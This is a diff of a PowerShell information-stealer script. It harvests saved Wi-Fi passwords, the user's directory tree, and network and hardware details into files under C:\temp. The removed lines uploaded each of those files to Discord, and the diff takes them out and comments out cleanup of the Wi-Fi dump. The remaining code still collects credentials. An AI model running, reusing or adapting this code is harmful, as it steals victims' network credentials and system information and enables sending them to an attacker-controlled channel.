@@ -91,9 +91,7 @@ function Exfiltration {
     StorageAndTreeInfo
 
     # Call the function to get network information
-    $networkInfoPath = NetworkInfo
-    # Upload NetworkInfo.txt to Discord
-    Upload-Discord -file $networkInfoPath -text "Network Information :"
+    NetworkInfo
 
     #Call HardwareInfo
     HardwareInfo
@@ -131,14 +129,12 @@ function Wifi {
         $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
     } | Out-File -FilePath "Wifi_Passwords.txt" -Encoding utf8
 
-    # Charge le fichier Wifi_Passwords.txt sur Discord
-    Upload-Discord -file "Wifi_Passwords.txt" -text "Wifi password :"
-
     # Retourne au dossier temporaire C:\temp
     Set-Location -Path "C:\temp"
-
+<#
     # Supprime le dossier temporaire wifi
     Remove-Item -Path "C:\temp\wifi" -Force -Recurse
+#>
 }
 
 
@@ -159,9 +155,6 @@ function StorageAndTreeInfo {
 
     # Run the 'tree' command and append the output to Storage_Info.txt
     tree $Env:userprofile /a /f | Out-File -FilePath $storageFilePath -Append -Encoding utf8
-
-    # Upload Storage_Info.txt to Discord
-    Upload-Discord -file $storageFilePath -text "Storage and Directory Tree Information :"
 }
 
 
@@ -284,8 +277,6 @@ function NetworkInfo {
         "$listener"
     ) | Out-File -FilePath $networkInfoPath
 
-    # Return the output path
-    $networkInfoPath
 }
 
 function HardwareInfo {
@@ -428,11 +419,6 @@ $($networkAdapters | Format-Table | Out-String)
     $HardwareInfoPath = "C:\temp\Hardware_Info.txt"
     $output | Out-File -FilePath $HardwareInfoPath -Encoding utf8
 
-    # Display the output path
-    $HardwareInfoPath
-
-    # Upload Hardware_Info.txt to Discord
-    Upload-Discord -file $HardwareInfoPath -text "Hardware Informations :"
 }
 
 
